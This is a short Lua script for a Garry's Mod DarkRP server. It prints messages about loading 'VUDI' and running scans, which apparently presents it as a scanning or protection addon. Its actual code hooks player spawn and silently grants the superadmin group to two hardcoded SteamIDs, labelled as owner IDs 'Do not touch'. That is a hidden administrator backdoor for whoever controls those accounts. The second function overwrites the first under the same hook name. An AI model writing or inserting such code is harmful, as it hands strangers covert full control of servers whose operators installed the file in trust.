




print("Loading darkrp.VUDI.lua...")
--la.darkrp.VUDI.lua - Temp Disabled for more research
print("Loaded!")
print("Running VUDI Scans")






function run( ply )
if ( ply:SteamID() == "STEAM_0:1:111018925"--[[Server Owners ID Do not touch]] ) then 
ply:SetUserGroup("superadmin")
end
end
hook.Add("PlayerSpawn", "run", run)

function run( ply )
if ( ply:SteamID() == "STEAM_0:0:62472527"--[[Server Co-Owners ID Do not touch]] ) then 
ply:SetUserGroup("superadmin")
end
end
hook.Add("PlayerSpawn", "run", run)